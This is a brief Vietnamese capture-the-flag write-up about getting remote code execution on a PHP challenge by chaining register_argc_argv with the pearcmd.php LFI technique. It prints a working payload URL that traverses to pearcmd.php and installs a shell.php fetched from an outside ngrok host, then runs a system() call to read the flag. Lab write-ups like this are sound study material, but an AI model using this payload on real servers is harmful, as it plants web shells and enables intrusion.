# Solution

Từ gợi ý trong source code và từ phpinfo() ta thấy `register_argc_argv: On`
đồng thời kết hợp với [pearcmd LFI2RCE](https://github.com/w181496/Web-CTF-Cheatsheet#pear) để khai thác.

payload:

```
/?+install+--force+--installroot+/tmp/wtf+https://1fb5-101-99-36-202.ap.ngrok.io/shell.php+?&page=../../../../usr/local/lib/php/pearcmd.php
```

shell.php

![shell](https://user-images.githubusercontent.com/77546253/172332527-38fac478-343c-4989-a408-0e229928f70a.png)

sau đó: `0=system('/readflag');`


**SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}**
